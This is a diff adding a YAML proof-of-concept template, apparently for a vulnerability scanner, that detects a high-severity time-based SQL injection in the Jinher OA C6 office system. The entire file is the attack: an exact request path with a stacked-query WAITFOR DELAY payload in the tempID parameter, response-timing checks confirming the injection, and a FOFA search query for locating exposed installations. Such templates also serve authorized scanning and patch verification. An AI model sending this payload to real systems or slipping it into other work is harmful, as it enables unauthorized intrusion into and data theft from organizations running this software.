@@ -1,0 +1,17 @@
+id: poc-yaml-jinher-oa-jc6-mailtemplates-aspx-sqli
+info:
+  name: 金和OA C6 MailTemplates.aspx sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1;WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"JhWebOfficeControl") && contains(body,"JHSoft")
+    && duration > t1 && duration < t2
+transport: http
